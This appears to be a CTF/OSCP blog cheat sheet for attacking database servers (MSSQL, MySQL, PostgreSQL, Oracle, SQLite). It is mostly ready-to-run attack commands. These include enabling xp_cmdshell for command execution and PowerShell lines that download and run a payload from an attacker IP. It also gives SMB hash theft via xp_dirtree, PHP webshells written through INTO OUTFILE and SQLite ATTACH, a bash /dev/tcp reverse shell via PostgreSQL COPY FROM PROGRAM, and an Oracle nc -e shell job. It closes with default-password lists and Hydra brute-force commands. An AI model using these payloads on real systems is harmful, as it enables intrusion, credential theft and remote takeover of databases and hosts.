---
title: SQL Injection
published: 2026-06-07
updated: 2026-06-07
description: Cheatsheet and methodology for SQL Injection during CTFs and Exams.
image: checklist1.png
tags:
  - sql
  - injection
  - cheatsheet
category: Web Hacking
draft: false
---
# Database Enumeration & Exploitation Cheat Sheet

## I. Enumeration Chronology (The Workflow)

1. **Identity & Context:** "Who am I and what permissions do I have immediately?" (Don't waste time querying tables if you are already `sysadmin`).   
2. **Environment:** "What version/OS is this?" (Checks for known CVEs or specific exploits like `xp_cmdshell`).
3. **Privilege Hunting:** "Can I impersonate someone? Are there other admins? Are there Linked Servers?"
4. **Database Structure:** "What databases exist? Where is the sensitive data stored?"
5. **System Interaction (The Goal):** "Can I read files, write shells, or execute system commands?"

---
## II. MSSQL (Microsoft SQL Server)

**Context:** Highly prevalent in Windows environments. Primary targets during OSCP include Remote Code Execution (RCE) via `xp_cmdshell`, privilege escalation via Token Impersonation, and lateral movement via Linked Servers. Default port: `1433/TCP`.

### Connection

- **Impacket:** `impacket-mssqlclient DOMAIN/User:Password@192.168.x.x -windows-auth`
	- Remove `-windows-auth` for local auth.
    
- **NetExec (Testing logins):** `nxc mssql 192.168.x.x -u User -p Password`
    
- **Sqsh (Linux Client):** `sqsh -S 192.168.x.x -U DOMAIN\\User -P Password`
    

---

### Phase 1: Identity & Current Privileges

| **Function**            | **Command (T-SQL)**                                                                                                                                                      |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **All-in-one (whoami)** | `SELECT SYSTEM_USER AS [Login_Name], USER_NAME() AS [DB_User], IS_SRVROLEMEMBER('sysadmin') AS [Is_Sysadmin], DB_NAME() AS [Current_DB], @@SERVERNAME AS [Server_Name];` |
| **Current User**        | `SELECT SYSTEM_USER;` or `SELECT user_name();`                                                                                                                           |
| **Is Admin?**           | `SELECT IS_SRVROLEMEMBER('sysadmin');` _(Returns 1 if yes)_                                                                                                              |
| **All My Permissions**  | `SELECT * FROM fn_my_permissions(NULL, 'SERVER');`                                                                                                                       |
| **Effective Perms**     | `EXECUTE AS LOGIN = 'sa'; SELECT * FROM fn_my_permissions(NULL, 'SERVER'); REVERT;`                                                                                      |
| **Get Your SID**        | `SELECT SUSER_SID();`                                                                                                                                                    |
| **Get Windows Groups**  | `EXEC xp_logininfo 'DOMAIN\User', 'all';`                                                                                                                                |
| **List Server Logins**  | `SELECT name, type_desc, is_disabled FROM sys.server_principals;`                                                                                                        |
| **List DB Users**       | `SELECT name, type_desc, authentication_type_desc FROM sys.database_principals;`                                                                                         |

---

### Phase 2: Environment & Users

|**Function**|**Command (T-SQL)**|
|---|---|
|**Server Version**|`SELECT @@version;`|
|**List All Users**|`SELECT name FROM master..syslogins;`|
|**List Admin Users**|`SELECT name FROM master..syslogins WHERE sysadmin = '1';`|
|**Active Sessions**|`SELECT login_name, host_name, program_name FROM sys.dm_exec_sessions;`|
|**Find 'Control' Users**|`SELECT pr.name, pe.permission_name FROM sys.server_principals pr JOIN sys.server_permissions pe ON pr.principal_id = pe.grantee_principal_id WHERE pe.permission_name = 'CONTROL SERVER';`|

---

### Phase 3: Privilege Escalation & Lateral Movement

|**Function**|**Command (T-SQL)**|
|---|---|
|**Check Impersonation**|`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`|
|**Impersonate User**|`EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;` _(Run `REVERT;` to go back)_|
|**Find Linked Servers**|`EXEC sp_linkedservers;` or `SELECT * FROM sys.servers WHERE is_linked = 1;`|
|**Query Linked Server**|`SELECT * FROM OPENQUERY("REMOTE_SERVER", 'SELECT SYSTEM_USER');`|
|**Exec on Remote**|`EXEC ('xp_cmdshell ''whoami''') AT [REMOTE_SERVER];`|
|**Chain Linked Servers**|`SELECT * FROM OPENQUERY("SERVER1", 'SELECT * FROM OPENQUERY("SERVER2", ''SELECT SYSTEM_USER'')');`|
|**Steal Hash (SMB)**|`EXEC master..xp_dirtree '\\<YOUR_IP>\share';` _(Catch with Responder/Inveigh)_|

---

### Phase 4: Database & Table Enumeration

|**Function**|**Command (T-SQL)**|
|---|---|
|**List Databases**|`SELECT name FROM master..sysdatabases;`|
|**List Tables (Current DB)**|`SELECT * FROM information_schema.tables;`|
|**Search Columns (Pass)**|`SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';`|
|**Read Data**|`SELECT * FROM [DBName].[SchemaName].[TableName];` _(e.g., `dbo.users`)_|
|**Find Passwords Across DB**|`EXEC sp_MSforeachdb 'USE [?]; SELECT ''?'' AS DB, * FROM information_schema.columns WHERE column_name LIKE ''%pass%'';';`|

---

### Phase 5: Command Execution (RCE)

If you have `sysadmin` privileges, you can enable specific features to achieve RCE.

|**Function**|**Command (T-SQL)**|
|---|---|
|**Enable xp_cmdshell**|`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`|
|**Run Command**|`EXEC xp_cmdshell 'whoami /priv';`|
|**Enable OLE Automation**|`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;`|
|**Run Command via OLE**|`DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd.exe /c whoami > C:\temp\out.txt';`|

---

### Phase 6: File System Access

|**Function**|**Command (T-SQL)**|
|---|---|
|**Read Local File**|`SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;`|

---

### T-SQL Syntax Primer

Before enumerating, understanding the structure of T-SQL (Transact-SQL) commands prevents relying on blind copy-pasting.

- **`SELECT`**: Retrieves data from tables or system views.
    
- **`EXEC` / `EXECUTE`**: Runs a Stored Procedure (pre-compiled scripts built into the server). Often prefixed with `sp_` (System Procedure) or `xp_` (Extended Procedure, which interacts with the OS).
    
- **`master..[table]`**: The `master` database stores system-level information. The `..` skips the schema name, directly querying the table (e.g., `master..syslogins`).
    
- **`OPENQUERY`**: Executes a pass-through query on a linked server. Useful for bypassing local restrictions or querying different environments (like Active Directory).
    
- **`';`**: Statement terminator. In SQL injection, you often use `;` to end the developer's query and begin your own.
    

---

### Extended MSSQL Enumeration Note

#### 1. Identity & Permissions

Establish who you are and what you can do.

|**Goal**|**T-SQL Command**|**Explanation**|
|---|---|---|
|**Current User & DB**|`SELECT SYSTEM_USER, DB_NAME();`|Identifies your login name and current context.|
|**Check Sysadmin**|`SELECT IS_SRVROLEMEMBER('sysadmin');`|Returns `1` if you have full server control.|
|**List Server Logins**|`SELECT name, is_disabled FROM sys.server_principals;`|Identifies all accounts that can log into the server.|
|**Check Impersonation**|`SELECT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`|Identifies if your current user can assume the privileges of a higher-privileged user (like `sa`).|
|**Execute Impersonation**|`EXECUTE AS LOGIN = 'sa';`|Switches your context. Run `REVERT;` to drop back.|

#### 2. Database & Data Extraction

Locate sensitive data within the hosted databases.

| **Goal**               | **T-SQL Command**                                                                                      | **Explanation**                                          |
| ---------------------- | ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------- |
| **List All Databases** | `SELECT name FROM master..sysdatabases;`                                                               | Enumerates available databases to target.                |
| **Search Columns**     | `SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';`      | Hunts for credential tables within the current database. |
| **Read Table Data**    | `SELECT * FROM [DatabaseName].[SchemaName].[TableName];`                                               | Extracts the actual data.                                |
| **Coercion**           | `nxc mssql $DC_IP -u users.txt -p passwords.txt --local-auth -M mssql_coerce -o LISTENER=$Attacker_IP` | Start a listener:<br>`sudo responder -I tun0`            |
|                        |                                                                                                        |                                                          |

- `Schema` is something like `dbo`
#### 3. Remote Code Execution (RCE)

Translate database access into operating system access. Requires `sysadmin` privileges.

| **Goal**               | **T-SQL Command**                                                                                                                                                                                            | **Explanation**                                                          |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------ |
| **Enable xp_cmdshell** | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`<br><br>`xp_cmdshell powershell.exe Invoke-WebRequest -Uri "http://<IP>/file -OutFile file.exe` | Turns on the extended procedure required to run OS commands.             |
| **Execute Command**    | `EXEC xp_cmdshell 'whoami';`                                                                                                                                                                                 | Runs the command in the context of the SQL Server service account.       |
| **Enable OLE**         | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;`                                                                                  | Alternative RCE method if `xp_cmdshell` is heavily monitored or blocked. |

#### 4. Lateral Movement: Linked Servers

Linked servers allow MSSQL to execute commands on remote database instances.

|**Goal**|**T-SQL Command**|**Explanation**|
|---|---|---|
|**Find Linked Servers**|`EXEC sp_linkedservers;`|Lists remote servers configured for access.|
|**Test Remote Access**|`SELECT * FROM OPENQUERY("REMOTE_SRV", 'SELECT SYSTEM_USER');`|Executes a basic query on the remote server to verify connection and context.|
|**Remote RCE**|`EXEC ('xp_cmdshell ''whoami''') AT [REMOTE_SRV];`|Attempts to run OS commands on the linked server.|

#### 5. Active Directory Enumeration via Linked Servers

If a linked server is configured to use the ADSI (Active Directory Service Interfaces) provider, you can query the Domain Controller directly using LDAP via SQL.

|**Goal**|**T-SQL Command**|**Explanation**|
|---|---|---|
|**Query All AD Users**|`SELECT * FROM OPENQUERY(ADSI, 'SELECT name, sAMAccountName FROM ''LDAP://DC=domain,DC=local'' WHERE objectClass=''user''');`|Extracts domain users. Replace `ADSI` with the name of the AD linked server.|
|**Query AD Groups**|`SELECT * FROM OPENQUERY(ADSI, 'SELECT name FROM ''LDAP://DC=domain,DC=local'' WHERE objectClass=''group''');`|Extracts domain groups.|
|**Search specific user**|`SELECT * FROM OPENQUERY(ADSI, 'SELECT distinguishedName FROM ''LDAP://DC=domain,DC=local'' WHERE sAMAccountName=''Administrator''');`|Finds the distinguished name of a specific target.|

---

#### If a hash is found in DB:

**ASP.NET Membership Hash Cracking (DNN)**
##### Requirements

Extract `Password` (Base64 Hash) and `PasswordSalt` (Base64 Salt) from the database where `PasswordFormat = 1`.
##### Hashcat (Mode 140)
Hashcat requires the base64 strings converted to hexadecimal format: `hash:salt`.
**1. Convert and format (Python):**

```Bash
python3 -c 'import base64; print(f"{base64.b64decode(\"BASE64_HASH\").hex()}:{base64.b64decode(\"BASE64_SALT\").hex()}")' > hashes.txt
```

**2. Execute Hashcat:**

```Bash
hashcat -m 140 hashes.txt /usr/share/wordlists/rockyou.txt
```

##### John the Ripper (JTR) -- **BETTER.**

JTR uses the `episerver` format and accepts raw base64 strings. `*0*` denotes SHA-1.

**1. Format the string:**

Save the following syntax into `hashes.txt`:

```
$episerver$*0*<BASE64_SALT>*<BASE64_HASH>
```

**2. Execute JTR:**

```Bash
john --format=episerver hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
##### Applicability

This method specifically targets the legacy ASP.NET `SqlMembershipProvider` using default SHA-1 hashing.

**Works When:**
- Legacy ASP.NET Membership provider is used.
- `PasswordFormat = 1` (Hashed).
- `web.config` defines `hashAlgorithmType` as `SHA1` (default in older .NET frameworks like DNN).

**Alternative Scenarios:**
- **Different Hash Algorithm:** Stronger algorithm in `web.config` (e.g., SHA256). Use Hashcat mode `1420`.
- **ASP.NET Identity Framework:** Modern framework, hashes usually start with `AA...` or `AQ...`. Use Hashcat mode `10000` (PBKDF2-HMAC-SHA1) or `10400` (PBKDF2-HMAC-SHA512).
- **Encrypted Passwords:** `PasswordFormat = 2` (AES/3DES). Cannot be cracked. Requires extracting `machineKey` from `web.config` to decrypt. 
- **Cleartext:** `PasswordFormat = 0`. No cracking required.

---
### Phase 5: RCE & System Interaction

**Enable `xp_cmdshell`:**
```SQL
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- DON'T FORGET TO ADD `-- -`--
```

**Commands & File I/O:**

| **Function**            | **Command (T-SQL)**                                                                                            |
| ----------------------- | -------------------------------------------------------------------------------------------------------------- |
| **Execute Command**     | `EXEC xp_cmdshell 'whoami';`                                                                                   |
| **PowerShell Download** | `EXEC xp_cmdshell 'powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<IP>/rev.ps1\");"';`     |
| **Check File Exist**    | `EXEC master..xp_fileexist 'C:\boot.ini';`                                                                     |
| **Read Registry**       | `EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName';` |
| **List Drives**         | `EXEC master..xp_fixeddrives;`                                                                                 |

---

## III. MySQL / MariaDB

**Context:** Common in Linux. RCE often requires `INTO OUTFILE` or UDF.

### Locations & Basic Syntax

- **Mac:** `/usr/local/mysql/bin`    
- **Windows:** `/Program Files/MySQL/MySQL version/bin`
- **Xampp:** `/xampp/mysql/bin`
- **Login:** `mysql -u root -p'root' -h $IP -P 3306 --skip-ssl-verify-server-cert`
	- Also try with blank password.

### Phase 1: Identity & Context

| **Function**           | **Command (SQL)**                                               |
| ---------------------- | --------------------------------------------------------------- |
| **Current User**       | `SELECT user();`                                                |
| **Current Privileges** | `SHOW GRANTS;`                                                  |
| **All Users/Privs**    | `SELECT user, host, grant_priv, super_priv FROM mysql.user;`    |
| **Secure File Priv**   | `SELECT @@secure_file_priv;` (Empty means write access allowed) |

### Phase 2: Enumeration

| **Function**               | **Command (SQL)**                                                                                               |
| -------------------------- | --------------------------------------------------------------------------------------------------------------- |
| **List Databases**         | `SHOW DATABASES;`                                                                                               |
| **Select Database**        | `USE [database_name];`                                                                                          |
| **List Tables**            | `SHOW TABLES;`                                                                                                  |
| **Search Columns**         | `SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';` |
| **Read Hashes**            | `SELECT host, user, authentication_string FROM mysql.user;`                                                     |
| **Read Contents of Table** | `Select * from <table_name>`                                                                                    |

### Phase 3: System Interaction (File I/O)

| **Function**         | **Command (SQL)**                                                                 |
| -------------------- | --------------------------------------------------------------------------------- |
| **Read File**        | `SELECT LOAD_FILE('/etc/passwd');`                                                |
| **Write Webshell**   | `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` |
| **Check Plugin Dir** | `SELECT @@plugin_dir;` (For UDF exploitation)                                     |

### MySQL Shell (mysqlsh) Enumeration Guide

**Core Usage**

- **Target:** MySQL X Protocol (Default Port 33060).
- **Connection:** `mysqlsh <user>@<IP>:33060 --password="<pass>" --ssl-mode=DISABLED`
	- Extra flags: `--mysqlx`, `--mysqlc`

**Enumeration Steps**

1. **Switch to SQL Mode:** `\sql`
2. **Context:** `SELECT user();`, `SELECT @@version;`, `SHOW GRANTS;`
3. **Discovery:** `SHOW DATABASES;`
4. **Tables:** `USE <db_name>;`, `SHOW TABLES;`    
5. **Data Extraction:** `SELECT * FROM <table_name>;`

---

## IV. PostgreSQL

**Connect with:** 
`psql -h <server_ip_address> -U <username> -d <database_name> -p 5432`

**Context:** Strong file read/write capabilities and RCE via extensions.

| **Function**         | **Command (SQL)**                                          |
| -------------------- | ---------------------------------------------------------- |
| **Current User**     | `SELECT current_user;`                                     |
| **List Users/Roles** | `SELECT usename, usesuper FROM pg_user;`                   |
| **Password Hashes**  | `SELECT usename, passwd FROM pg_shadow;` (Requires admin)  |
| **List Databases**   | `SELECT datname FROM pg_database;`                         |
| **Read File**        | `SELECT pg_read_file('/etc/passwd');`                      |
| **Write File**       | `COPY (SELECT 'shell code') TO '/var/www/html/shell.php';` |
| **RCE (Program)**    | `COPY (SELECT '') TO PROGRAM 'whoami';` (Superuser > 9.3)  |

### Get a reverse shell:
#### 1. Attack Infrastructure Setup: Enable SSH
- **Objective:** Allow incoming SSH connections to the attacker machine, typically to facilitate reverse port forwarding.
- **Configuration:** Edit `/etc/ssh/sshd_config`.
- **Action:** Ensure password authentication is enabled by setting `PasswordAuthentication yes`.
- **Command:**
```Bash
sudo service ssh start
```  

#### 2. Reverse Port Forwarding (Execution on Target)
- **Objective:** Expose a restricted internal service (e.g., a database) on the target machine to the attacker machine via an SSH tunnel. 
- **Command:**
```Bash
ssh -R *:<ATTACKER_PORT>:localhost:<TARGET_INTERNAL_PORT> <ATTACKER_USER>@<ATTACKER_IP>
```  

#### 3. Service Interaction
- **Objective:** Connect to the newly exposed internal service locally from the attacker machine.
- **Command (PostgreSQL Example):**
```Bash
psql -h 127.0.0.1 -p <ATTACKER_PORT> -U <DB_USER> -d <DB_NAME>
```  

#### 4. Remote Code Execution (RCE) via Database
- **Objective:** Exploit database functionality to force the target to send a reverse shell back to the attacker. 
- **Prerequisite:** Set up a network listener on the attacker machine (e.g., `nc -lvnp <LISTENER_PORT>`).
- **Commands (PostgreSQL `COPY FROM PROGRAM` Example):**
```SQL
CREATE TABLE tmp(t text);
COPY tmp FROM PROGRAM 'bash -c "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"';
```  

**WE CAN ALSO TAKE SHELL BY DOING: `\! /bin/sh`**
#### 5. Initial Post-Exploitation
- **Objective:** Assess immediate privilege escalation vectors upon catching the reverse shell. 
- **Prerequisite:** Obtain a stable, interactive TTY shell to ensure commands execute reliably without breaking the session.
- **Command:** 
```Bash
sudo -l
```  

#### 6. Shell Stabilization

- **Objective:** Upgrade a limited, non-interactive reverse shell into a semi-interactive TTY shell to ensure commands run reliably.  
- **Command:**
```Bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

#### 7. Privilege Escalation (Sudo Abuse)

- **Objective:** Leverage misconfigured `sudo` permissions to run a specific binary with elevated privileges.
- **Context:** This relies on the findings from the `sudo -l` command executed in the previous phase.
- **Command (PostgreSQL Example):**
```Bash
sudo psql -h 127.0.0.1 -p <PORT> -U <DB_USER> <DB_NAME>
```  

#### 8. Root Shell Escape

- **Objective:** Break out of the elevated binary's environment to obtain a system-level root shell.
- **Mechanism:** Utilize the binary's built-in capability to execute arbitrary system commands.  
- **Command (PostgreSQL Example):**
```SQL
\! /bin/sh
```  

---

## V. Oracle Database

**Context:** Uses `FROM dual` for single-row queries.

### Phase 1: Identity & Environment

| **Function**       | **Command (PL/SQL)**              |
| ------------------ | --------------------------------- |
| **Current User**   | `SELECT user FROM dual;`          |
| **Version**        | `SELECT banner FROM v$version;`   |
| **Current Privs**  | `SELECT * FROM session_privs;`    |
| **List DBA Users** | `SELECT username FROM dba_users;` |

### Phase 2: RCE (Scheduler)

```SQL
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'RCE',
    job_type => 'EXECUTABLE',
    job_action => '/bin/sh',
    number_of_arguments => 1
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE', 1, '-c "nc -e /bin/sh <IP> <PORT>"');
  DBMS_SCHEDULER.ENABLE('RCE');
END;
```

## VI. SQLite

**Context:** Serverless, file-based database. It has no internal user management or privilege system; access relies entirely on OS-level file permissions. Exploitation usually occurs via SQL injection in the host application or local file access.

### Connection

> [!INFO]
> 
> sqlite3 database.db

### Phase 1 & 2: Environment & Database Enumeration

|**Function**|**Command (SQLite)**|
|---|---|
|**Version**|`SELECT sqlite_version();`|
|**List Tables**|`SELECT name FROM sqlite_master WHERE type='table';`|
|**Table Schema (DDL)**|`SELECT sql FROM sqlite_master WHERE type='table';`|
|**List Columns (Specific Table)**|`PRAGMA table_info('table_name');`|
|**Search Columns (Requires v3.16.0+)**|`SELECT m.name AS table_name, p.name AS column_name FROM sqlite_master m JOIN pragma_table_info(m.name) p WHERE m.type = 'table' AND p.name LIKE '%pass%';`|
|**Read Data**|`SELECT * FROM [Table];`|

### Phase 3: System Interaction (File I/O & RCE)

SQLite limits system interaction by design, but file writing is possible if the underlying directory is writable by the application executing the SQL.

|**Function**|**Command (SQLite)**|
|---|---|
|**Write Webshell (File Creation)**|`ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.webshell (cmd TEXT); INSERT INTO shell.webshell (cmd) VALUES ('<?php system($_GET["cmd"]); ?>');`|
|**Load Extension (RCE via .so/.dll)**|`SELECT load_extension('/tmp/malicious.so');` _(Note: Frequently disabled by default in modern environments)._|

#### Read File (SQLite CLI Only)

Standard pure SQL in SQLite cannot read arbitrary files unless specific extensions are loaded. If you have access to the `sqlite3` command-line interface, you can use `.import`:

```SQL
CREATE TABLE temp_read(content TEXT);
.import '/etc/passwd' temp_read
SELECT * FROM temp_read;
```


## VII. Default Credentials & Brute-Forcing

**Context:** Before hunting for complex vulnerabilities, always verify if the database was deployed with default or blank credentials.

> [!WARNING]
> 
> **A Note on SQLite:** SQLite does not have network authentication, users, or a native credential system. It relies entirely on OS-level file permissions. Therefore, brute-forcing or default credential checks do not apply to SQLite.

### 1. MSSQL (Microsoft SQL Server)

The default administrative account for SQL Server Authentication is `sa`.

**Common Default Credentials:**

- `sa` / `<blank>`
- `sa` / `sa`
- `sa` / `password`

**Manual Connection Commands:**

| **Condition** | **Command** |
| :--- | :--- |
| **Blank Password** | `impacket-mssqlclient sa@<IP> -no-pass` |
| **Known Password** | `impacket-mssqlclient sa:password@<IP>` |
| **Alternative (sqsh)**| `sqsh -S <IP> -U sa -P ''` |

**Hydra Brute-Force:**

_(Focusing on the `sa` user is usually the highest yield)._

```Bash
# Brute-force 'sa' with rockyou
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<IP>

# Brute-force with a user list and password list
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt mssql://<IP>
```

---

### 2. MySQL / MariaDB

The default administrative account is `root`. It is frequently left without a password on basic or development deployments.

**Common Default Credentials:**

- `root` / `<blank>`
- `root` / `root`
- `admin` / `admin`

**Manual Connection Commands:**

| **Condition** | **Command** |
| :--- | :--- |
| **Blank Password** | `mysql -u root -h <IP> --skip-ssl-verify-server-cert` |
| **Known Password** | `mysql -u root -p'root' -h <IP> --skip-ssl-verify-server-cert` |

**Hydra Brute-Force:**

```Bash
# Brute-force 'root' with rockyou
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>

# Brute-force multiple default users
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt mysql://<IP>
```

---

### 3. PostgreSQL

The default administrative account is `postgres`. It often defaults to the password `postgres` or is configured to trust local connections (though network connections usually require auth).

**Common Default Credentials:**

- `postgres` / `postgres`
- `postgres` / `<blank>`
- `admin` / `admin`

**Manual Connection Commands:**

| **Condition** | **Command** |
| :--- | :--- |
| **Blank Password** | `psql -h <IP> -U postgres` |
| **Known Password** | `psql -h <IP> -U postgres -W` _(Will prompt for password)_ |

**Hydra Brute-Force:**

```Bash
# Brute-force 'postgres' with rockyou
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://<IP>

# Brute-force with dedicated Postgres wordlists
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt postgres://<IP>
```

---

### 4. Oracle Database

Oracle is notorious for having hundreds of default accounts depending on the installed components. Connecting usually requires knowing the **SID** or **Service Name** first (which can be enumerated via Nmap: `nmap -p 1521 --script oracle-sid-brute <IP>`).

**Common Default Credentials:**

- `scott` / `tiger`   
- `sys` / `change_on_install` (Often requires `AS SYSDBA`)
- `system` / `manager`    
- `dbsnmp` / `dbsnmp`


**Manual Connection Commands:**

| **Condition** | **Command** |
| :--- | :--- |
| **Standard Connect** | `sqlplus scott/tiger@<IP>:1521/<SID>` |
| **Connect as SYSDBA**| `sqlplus sys/change_on_install@<IP>:1521/<SID> "AS SYSDBA"` |

**Hydra Brute-Force:**

> [!NOTE]
> 
> Hydra's Oracle modules (`oracle` and `oracle-listener`) can be unstable depending on the Oracle version. ODAT (Oracle Database Attacking Tool) or Nmap scripts are often more reliable for Oracle.


```Bash
# Hydra syntax (Requires knowing the SID)
hydra -L /usr/share/seclists/Usernames/OracleDefaultUsernames.txt -P /usr/share/seclists/Passwords/OracleDefaultPasswords.txt oracle://<IP>:1521/<SID>

# Alternative: Nmap Oracle Brute-force (Often more reliable in OSCP labs)
nmap -p 1521 --script oracle-brute -v <IP>
```